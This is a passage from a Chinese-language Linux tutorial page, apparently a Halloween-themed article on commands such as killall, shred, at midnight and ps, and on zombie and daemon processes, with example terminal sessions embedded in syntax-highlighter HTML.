crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ killall runme\r\n[1] Terminated ./runme\r\n[2] Terminated ./runme\r\n[3]- Terminated ./runme\r\n[4]+ Terminated ./runme\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249acf670233668-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249acf670233668-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249acf670233668-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249acf670233668-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249acf670233668-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249acf670233668-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93249acf670233668-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">killall </span><span class=\"crayon-i\">runme</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249acf670233668-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Terminated</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">runme</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93249acf670233668-3\"><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Terminated</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">runme</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249acf670233668-4\"><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Terminated</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">runme</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93249acf670233668-5\"><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Terminated</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">runme</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249acf670233668-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p></p>\n<h3 id=\"toc_3\">shred</h3>\n<p>Linux 系统也支持一个名为 <code>shred</code> 的命令。<code>shred</code> 命令会覆盖文件以隐藏其以前的内容，并确保使用硬盘恢复工具无法恢复它们。请记住，<code>rm</code> 命令基本上只是删除文件在目录文件中的引用，但不一定会从磁盘上删除内容或覆盖它。<code>shred</code> 命令覆盖文件的内容。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93249ad4575177552\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ shred dupes.txt\r\n$ more dupes.txt\r\n▒oΛ▒▒9▒lm▒▒▒▒▒o▒1־▒▒f▒f▒▒▒i▒▒h^}&amp;▒▒▒{▒▒\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249ad4575177552-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249ad4575177552-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249ad4575177552-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249ad4575177552-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93249ad4575177552-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">shred </span><span class=\"crayon-v\">dupes</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249ad4575177552-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-v\">dupes</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93249ad4575177552-3\">▒<span class=\"crayon-i\">o</span>Λ▒▒<span class=\"crayon-cn\">9</span>▒<span class=\"crayon-i\">lm</span>▒▒▒▒▒<span class=\"crayon-i\">o</span>▒<span class=\"crayon-cn\">1</span>־▒▒<span class=\"crayon-i\">f</span>▒<span class=\"crayon-i\">f</span>▒▒▒<span class=\"crayon-i\">i</span>▒▒<span class=\"crayon-v\">h</span><span class=\"crayon-o\">^</span><span class=\"crayon-sy\">}</span><span class=\"crayon-o\">&amp;</span>▒▒▒<span class=\"crayon-sy\">{</span>▒▒</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249ad4575177552-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n<h3 id=\"toc_4\">僵尸</h3>\n<p>虽然不是命令，但僵尸在 Linux 系统上是很顽固的存在。僵尸基本上是没有完全清理掉的死亡进程的遗骸。进程<em>不应该</em>这样工作 —— 让死亡进程四处游荡，而不是简单地让它们死亡并进入数字天堂，所以僵尸的存在表明了让他们遗留于此的进程有一些缺陷。</p>\n<p>一个简单的方法来检查你的系统是否有僵尸进程遗留，看看 <code>top</code> 命令的标题行。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93249ad7417945548\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ top\r\ntop - 18:50:38 up 6 days, 6:36, 2 users, load average: 0.00, 0.00, 0.00\r\nTasks: 171 total, 1 running, 167 sleeping, 0 stopped, 3 zombie  `&lt; ==`\r\n%Cpu(s): 0.0 us, 0.0 sy, 0.0 ni, 99.9 id, 0.1 wa, 0.0 hi, 0.0 si, 0.0 st\r\nKiB Mem : 2003388 total, 250840 free, 545832 used, 1206716 buff/cache\r\nKiB Swap: 9765884 total, 9765764 free, 120 used. 1156536 avail Mem</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249ad7417945548-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249ad7417945548-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249ad7417945548-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249ad7417945548-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249ad7417945548-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249ad7417945548-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249ad7417945548-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93249ad7417945548-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">top</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249ad7417945548-2\"><span class=\"crayon-v\">top</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">50</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">38</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">up</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">days</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">36</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">users</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">load </span><span class=\"crayon-v\">average</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.00</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.00</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.00</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93249ad7417945548-3\"><span class=\"crayon-v\">Tasks</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">171</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">total</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">running</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">167</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sleeping</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">stopped</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">zombie</span><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">`</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249ad7417945548-4\"><span class=\"crayon-ta\">%</span><span class=\"crayon-e\">Cpu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">us</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sy</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ni</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">99.9</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wa</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hi</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">si</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">st</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93249ad7417945548-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249ad7417945548-6\"><span class=\"crayon-e\">KiB </span><span class=\"crayon-v\">Mem</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2003388</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">total</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">250840</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">free</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">545832</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">used</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1206716</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">buff</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">cache</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93249ad7417945548-7\"><span class=\"crayon-e\">KiB </span><span class=\"crayon-v\">Swap</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9765884</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">total</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9765764</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">free</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">120</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">used</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1156536</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">avail </span><span class=\"crayon-v\">Mem</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0057 seconds] -->\r\n<p>可怕！上面显示有三个僵尸进程。</p>\n<h3 id=\"toc_5\">at midnight</h3>\n<p>有时会在万圣节这么说，死者的灵魂从日落开始游荡直到午夜。Linux 可以通过 <code>at midnight</code> 命令跟踪它们的离开。用于安排在下次到达指定时间时运行的作业，<code>at</code> 的作用类似于一次性的 cron。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93249adb088015548\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ at midnight\r\nwarning: commands will be executed using /bin/sh\r\nat&gt; echo 'the spirits of the dead have left'\r\nat&gt; &lt;EOT&gt;\r\njob 3 at Thu Oct 31 00:00:00 2017\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249adb088015548-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249adb088015548-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249adb088015548-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249adb088015548-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249adb088015548-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249adb088015548-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93249adb088015548-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">at </span><span class=\"crayon-e\">midnight</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249adb088015548-2\"><span class=\"crayon-v\">warning</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">commands </span><span class=\"crayon-e\">will </span><span class=\"crayon-e\">be </span><span class=\"crayon-e\">executed </span><span class=\"crayon-v\">using</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">sh</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93249adb088015548-3\"><span class=\"crayon-v\">at</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'the spirits of the dead have left'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249adb088015548-4\"><span class=\"crayon-v\">at</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">EOT</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93249adb088015548-5\"><span class=\"crayon-i\">job</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">at </span><span class=\"crayon-e\">Thu </span><span class=\"crayon-i\">Oct</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">31</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2017</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249adb088015548-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p></p>\n<h3 id=\"toc_6\">守护进程</h3>\n<p>Linux 系统也高度依赖守护进程 —— 在后台运行的进程，并提供系统的许多功能。许多守护进程的名称以 “d” 结尾。这个 “d” 代表守护进程daemon，表明这个进程一直运行并支持一些重要功能。有的会用单词 “daemon” 。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93249adf543577228\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ps -ef | grep sshd\r\nroot 1142 1 0 Oct19 ? 00:00:00 /usr/sbin/sshd -D\r\nroot 25342 1142 0 18:34 ? 00:00:00 sshd: shs [priv]\r\n$ ps -ef | grep daemon | grep -v grep\r\nmessage+ 790 1 0 Oct19 ? 00:00:01 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation\r\nroot 836 1 0 Oct19 ? 00:00:02 /usr/lib/accountsservice/accounts-daemon\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249adf543577228-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249adf543577228-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249adf543577228-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249adf543577228-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249adf543577228-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249adf543577228-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249adf543577228-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93249adf543577228-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ps</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">ef</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">grep </span><span class=\"crayon-e\">sshd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249adf543577228-2\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1142</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Oct19</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sshd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">D</span></div><div class=\"crayon-line\" 